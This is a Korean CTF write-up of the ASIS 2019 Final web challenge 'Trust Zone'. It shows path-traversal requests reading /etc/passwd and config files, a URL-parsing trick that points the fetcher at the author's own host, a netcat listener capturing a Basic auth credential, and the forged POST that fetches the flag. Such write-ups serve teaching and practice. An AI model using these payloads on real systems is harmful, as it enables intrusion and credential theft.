<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="HandheldFriendly" content="True"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><meta name="description" content="12&#x2F;&#x2F; http:&#x2F;&#x2F;66.172.33.59:5000&#x2F;&amp;#123;&quot;code&quot;:200,&quot;data&quot;:&amp;#123;&quot;start&quot;:&quot;&#x2F;get_doc?url&#x3D;http:&#x2F;&#x2F;66.172.33.59&#x2F;docs&#x2F;doc1.doc&quot;&amp;#125;&amp;#125;서버에 접속하면, 먼저 링크가 하나 주어집니다.12&#x2F;&#x2F; http:&#x2F;&#x2F;66.172.33.59:5000&#x2F;get_doc?url&#x3D;http"><meta property="og:type" content="article"><meta property="og:title" content="ASIS 2019 Final - Trust Zone"><meta property="og:url" content="https://blog.p6.is/asis-2019-final-trust-zone/index.html"><meta property="og:site_name" content="POSIX"><meta property="og:description" content="12&#x2F;&#x2F; http:&#x2F;&#x2F;66.172.33.59:5000&#x2F;&amp;#123;&quot;code&quot;:200,&quot;data&quot;:&amp;#123;&quot;start&quot;:&quot;&#x2F;get_doc?url&#x3D;http:&#x2F;&#x2F;66.172.33.59&#x2F;docs&#x2F;doc1.doc&quot;&amp;#125;&amp;#125;서버에 접속하면, 먼저 링크가 하나 주어집니다.12&#x2F;&#x2F; http:&#x2F;&#x2F;66.172.33.59:5000&#x2F;get_doc?url&#x3D;http"><meta property="og:locale" content="en_US"><meta property="article:published_time" content="2019-11-18T00:00:00.000Z"><meta property="article:modified_time" content="2020-02-23T19:05:16.000Z"><meta property="article:author" content="posix"><meta property="article:tag" content="ASIS CTF"><meta name="twitter:card" content="summary"><link rel="shortcut icon" href="https://www.gravatar.com/avatar/b014d4712efdcda5c822e4ede732e29a?s=16"><link rel="icon" type="image/png" href="https://www.gravatar.com/avatar/b014d4712efdcda5c822e4ede732e29a?s=192" sizes="192x192"><link rel="apple-touch-icon" sizes="180x180" href="https://www.gravatar.com/avatar/b014d4712efdcda5c822e4ede732e29a?s=180"><title>ASIS 2019 Final - Trust Zone</title><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/rtl.css"><meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="POSIX" type="application/atom+xml"></head><body class="max-width mx-auto px3 ltr"><div id="header-post"><a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a> <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a> <a id="top-icon-tablet" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")' style="display:none"><i class="fas fa-chevron-up fa-lg"></i></a> <span id="menu"><span id="nav"><ul></ul></span><br><span id="actions"><ul><li><a class="icon" href="/bypassing-a-js-sandbox/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle()' onmouseout='$("#i-prev").toggle()'></i></a></li><li><a class="icon" href="/prototype-pollution-to-rce/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle()' onmouseout='$("#i-next").toggle()'></i></a></li><li><a class="icon" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")'><i class="fas fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle()' onmouseout='$("#i-top").toggle()'></i></a></li><li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle()' onmouseout='$("#i-share").toggle()' onclick='return $("#share").toggle(),!1'></i></a></li></ul><span id="i-prev" class="info" style="display:none">Previous post</span> <span id="i-next" class="info" style="display:none">Next post</span> <span id="i-top" class="info" style="display:none">Back to top</span> <span id="i-share" class="info" style="display:none">Share post</span></span><br><div id="share" style="display:none"><ul><li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.p6.is/asis-2019-final-trust-zone/"><i class="fab fa-facebook" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.p6.is/asis-2019-final-trust-zone/&text=ASIS 2019 Final - Trust Zone"><i class="fab fa-twitter" aria-hidden="true"></i></a></li></ul></div><div id="toc"></div></span></div><div class="content index py4"><article class="post" itemscope itemtype="http://schema.org/BlogPosting"><header><h1 class="posttitle" itemprop="name headline">ASIS 2019 Final - Trust Zone</h1><div class="meta"><span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><span itemprop="name">POSIX</span></span><div class="postdate">&nbsp;<time datetime="2019-11-18T00:00:00.000Z" itemprop="datePublished">2019-11-18</time></div>&nbsp;<div class="article-category">&nbsp;<i class="fas fa-archive"></i> <a class="category-link" href="/category/writeup/">Writeup</a></div>&nbsp;<div class="article-tag">&nbsp;<i class="fas fa-tag"></i> <a class="tag-link-link" href="/tags/ASIS-CTF/" rel="tag">ASIS CTF</a></div>&nbsp;</div></header><div class="content" itemprop="articleBody"><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// http://66.172.33.59:5000/</span></span><br><span class="line">&#123;<span class="attr">"code"</span>:<span class="number">200</span>,<span class="attr">"data"</span>:&#123;<span class="attr">"start"</span>:<span class="string">"/get_doc?url=http://66.172.33.59/docs/doc1.doc"</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>서버에 접속하면, 먼저 링크가 하나 주어집니다.</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// http://66.172.33.59:5000/get_doc?url=http://66.172.33.59/docs/doc1.doc</span></span><br><span class="line">&#123;<span class="attr">"code"</span>:<span class="number">200</span>,<span class="attr">"data"</span>:&#123;<span class="attr">"the doc content"</span>:<span class="string">"b'Doc 1'"</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>접속하면 문서 내용이 표시되는데, 특별한 내용은 없습니다.<br>인자의 URL 부분을 퍼징해 보면 앞의 <code>http://66.172.33.59/</code> 와 끝의 <code>.doc</code> 에 static 한 비교를 수행하고 있다는 것을 알 수 있습니다.<br>어느 한 부분이라도 만족하지 못하면, <code>Security Error</code> 를 반환합니다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- http://66.172.33.59:5000/get_doc?url=http://66.172.33.59/.doc --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">HTML</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">"-//W3C//DTD HTML 3.2 Final//EN"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Index of /<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Index of /<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">th</span> <span class="attr">valign</span>=<span class="string">"top"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"/icons/blank.gif"</span> <span class="attr">alt</span>=<span class="string">"[ICO]"</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"?C=N;O=D"</span>&gt;</span>Name<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"?C=M;O=A"</span>&gt;</span>Last modified<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"?C=S;O=A"</span>&gt;</span>Size<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"?C=D;O=A"</span>&gt;</span>Description<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">th</span> <span class="attr">colspan</span>=<span class="string">"5"</span>&gt;</span><span class="tag">&lt;<span class="name">hr</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">valign</span>=<span class="string">"top"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"/icons/folder.gif"</span> <span class="attr">alt</span>=<span class="string">"[DIR]"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"doc_app/"</span>&gt;</span>doc_app/<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span>&gt;</span>2019-11-14 14:51  <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span>&gt;</span>  - <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">valign</span>=<span class="string">"top"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"/icons/folder.gif"</span> <span class="attr">alt</span>=<span class="string">"[DIR]"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"docs/"</span>&gt;</span>docs/<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span>&gt;</span>2019-11-14 14:51  <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span>&gt;</span>  - <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">valign</span>=<span class="string">"top"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"/icons/folder.gif"</span> <span class="attr">alt</span>=<span class="string">"[DIR]"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"flag/"</span>&gt;</span>flag/<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span>&gt;</span>2019-11-14 14:51  <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span>&gt;</span>  - <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">th</span> <span class="attr">colspan</span>=<span class="string">"5"</span>&gt;</span><span class="tag">&lt;<span class="name">hr</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">address</span>&gt;</span>Apache/2.4.38 (Debian) Server at 66.172.33.59 Port 80<span class="tag">&lt;/<span class="name">address</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>http://66.172.33.59/.doc</code> 을 URL 에 넣어 확인해 보면<br>이 처럼 디렉토리 리스팅이 되는 것을 확인할 수 있습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;doc_app</span><br><span class="line">---- doc.php</span><br><span class="line">&#x2F;docs</span><br><span class="line">---- doc1</span><br><span class="line">---- doc2</span><br><span class="line">---- doc3</span><br><span class="line">&#x2F;flag</span><br><span class="line">---- flag.php</span><br></pre></td></tr></table></figure><p>정리해보면, 내부 웹 서버 구조는 위와 같습니다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>DOC Reader<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"?filename=docktest"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>이 중에 <code>/doc_app/doc.php</code> 파일이 수상해 보입니다.<br>인자로 파일 이름을 줄 수 있는데, 실제로 테스트해보면 <code>Traversal</code> 이 가능합니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; http:&#x2F;&#x2F;66.172.33.59:5000&#x2F;get_doc?url&#x3D;http:&#x2F;&#x2F;66.172.33.59&#x2F;doc_app&#x2F;doc.php?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd%23.doc</span><br><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:100:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br></pre></td></tr></table></figure><p>위와 같은 방법으로 <code>/etc/passwd</code> 파일을 읽을 수 있었습니다.</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- http://66.172.33.59:5000/get_doc?url=http://66.172.33.59/doc_app/doc.php?filename=../../../etc/apache2/sites-enabled/000-default.conf%23.doc --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Directory</span> /<span class="attr">srv</span>/&gt;</span></span><br><span class="line">       Options Indexes FollowSymLinks</span><br><span class="line">       Require all granted</span><br><span class="line"><span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">VirtualHost</span> *<span class="attr">:80</span>&gt;</span></span><br><span class="line">    DocumentRoot /srv/app/public</span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Directory</span> "/<span class="attr">srv</span>/<span class="attr">app</span>/<span class="attr">public</span>"&gt;</span></span><br><span class="line">        AllowOverride all</span><br><span class="line">        Require all granted</span><br><span class="line">    <span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log</span><br><span class="line">    CustomLog $&#123;APACHE_LOG_DIR&#125;/access.log combined</span><br><span class="line"><span class="tag">&lt;/<span class="name">VirtualHost</span>&gt;</span></span><br></pre></td></tr></table></figure><p>아파치 설정 파일을 통해, 웹 루트를 확인할 수 있습니다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- http:<span class="comment">//66.172.33.59:5000/get_doc?url=http://66.172.33.59/doc_app/doc.php?filename=../../../srv/app/public/flag/flag.php%23.doc --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'REQUEST_METHOD'</span>] === <span class="string">'POST'</span>) &#123;</span><br><span class="line">	<span class="keyword">echo</span> $_ENV[<span class="string">'FLAG'</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'This page only accepts POST method'</span>;	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>/flag/flag.php</code> 파일을 확인하면, POST 메소드로 호출할 시에<br>환경변수에 저장된 FLAG를 출력해 주도록 되어 있습니다.<br>그러나 현재는 GET 메소드로만 호출이 가능한 상황이므로 플래그를 얻는 것이 불가능합니다.</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- /srv/app/public/.htaccess --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IfModule</span> <span class="attr">mod_rewrite.c</span>&gt;</span></span><br><span class="line">    RewriteEngine On</span><br><span class="line">    RedirectMatch 301 (.*).doc$ http://66.172.33.59$1</span><br><span class="line"><span class="tag">&lt;/<span class="name">IfModule</span>&gt;</span></span><br><span class="line"></span><br><span class="line">AuthType Basic</span><br><span class="line">AuthName "Restricted Content"</span><br><span class="line">AuthUserFile /etc/apache2/.htpasswd</span><br><span class="line">Require valid-user</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- /etc/apache2/.htpsswd --&gt;</span></span><br><span class="line">secr3tUser_sys:$apr1$aWUbyZd0$Ge9ygNPiGeccI5iz645.X0</span><br></pre></td></tr></table></figure><p>내부 서버에 직접 접속할 수 있다면, POST 메소드로 페이지를 요청하는 것도 간단할 것 같습니다.<br>하지만 실제로 접속해보면, 연결 자체가 블록되어 있지는 않지만, basic 인증을 요구하고 있습니다.<br><code>.htpasswd</code> 에서 해시값은 알 수 있지만, 평문 패스워드를 알아낼 수는 없습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- http:&#x2F;&#x2F;66.172.33.59:5000&#x2F;get_doc?url&#x3D;http:&#x2F;&#x2F;66.172.33.59&#x2F;%0a%0d.doc --&gt;</span><br><span class="line">HTTPConnectionPool(host&#x3D;&#39;66.172.33.59%0d&#39;, port&#x3D;80): Max retries exceeded with url: &#x2F; (Caused by NewConnectionError(&#39;&lt;urllib3.connection.HTTPConnection object at 0x7f953e32ccd0&gt;: Failed to establish a new connection: [Errno -2] Name or service not known&#39;))</span><br></pre></td></tr></table></figure><p><code>CRLF Injection</code> 혹은 타 호스트로의 접속을 유도할 수 있다면 문제 해결이 가능할 것 같습니다.<br>따라서 <code>CRLF Injection</code> 이 가능 유무를 확인하던 도중 이상 현상을 확인했습니다.<br>TrustZone 에서 호스트를 파싱하는 로직에 문제가 있어 보입니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; http:&#x2F;&#x2F;66.172.33.59:5000&#x2F;get_doc?url&#x3D;http:&#x2F;&#x2F;66.172.33.59&#x2F;%0a%0d@.doc</span><br><span class="line">No host specified.</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; http:&#x2F;&#x2F;66.172.33.59:5000&#x2F;get_doc?url&#x3D;http:&#x2F;&#x2F;66.172.33.59&#x2F;%0a%0d@rwx.kr.doc</span><br><span class="line">[Server Content]</span><br></pre></td></tr></table></figure><p>위와 같은 방법으로 대상 호스트를 변경 할 수 있었습니다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@rwx:/var/www/html<span class="comment"># nc -lvp 9999</span></span><br><span class="line">Listening on [0.0.0.0] (family 0, port 9999)</span><br><span class="line">Connection from ip-66-172-33-59.chunkhost.com 45572 received!</span><br><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: rwx.kr:9999</span><br><span class="line">User-Agent: python-requests/2.22.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Authorization: Basic c2VjcjN0VXNlcl9zeXM6ZWQ2MGNiZDYwZTgzNzg4NTg5YTI1NGUxMzZiYjAzMGI=</span><br></pre></td></tr></table></figure><p>그러면 요청에 포함된 헤더를 통해 크리덴셜을 확인할 수 있습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[REQUEST]</span><br><span class="line">POST &#x2F;flag&#x2F;flag.php? HTTP&#x2F;1.1</span><br><span class="line">Host: 66.172.33.59</span><br><span class="line">Accept: text&#x2F;html</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Authorization: Basic c2VjcjN0VXNlcl9zeXM6ZWQ2MGNiZDYwZTgzNzg4NTg5YTI1NGUxMzZiYjAzMGI&#x3D;</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">[RESPONSE]</span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Date: Mon, 18 Nov 2019 20:20:10 GMT</span><br><span class="line">Server: Apache&#x2F;2.4.38 (Debian)</span><br><span class="line">X-Powered-By: PHP&#x2F;7.3.11</span><br><span class="line">Content-Length: 38</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;UTF-8</span><br><span class="line"></span><br><span class="line">ASIS&#123;ce4e0de7ace0353bc9370d36365c3a17&#125;</span><br></pre></td></tr></table></figure><p>이를 이용하면, Trust Zone 내부 서버에 직접 접속이 가능해지므로, 플래그를 얻을 수 있습니다.</p></div></article><div class="blog-post-comments"><div id="disqus_thread"><noscript>Please enable JavaScript to view the comments.</noscript></div></div><div id="footer-post-container"><div id="footer-post"><div id="nav-footer" style="display:none"><ul></ul></div><div id="toc-footer" style="display:none"></div><div id="share-footer" style="display:none"><ul><li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.p6.is/asis-2019-final-trust-zone/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.p6.is/asis-2019-final-trust-zone/&text=ASIS 2019 Final - Trust Zone"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li></ul></div><div id="actions-footer"><a id="menu" class="icon" href="#" onclick='return $("#nav-footer").toggle(),!1'><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a> <a id="toc" class="icon" href="#" onclick='return $("#toc-footer").toggle(),!1'><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a> <a id="share" class="icon" href="#" onclick='return 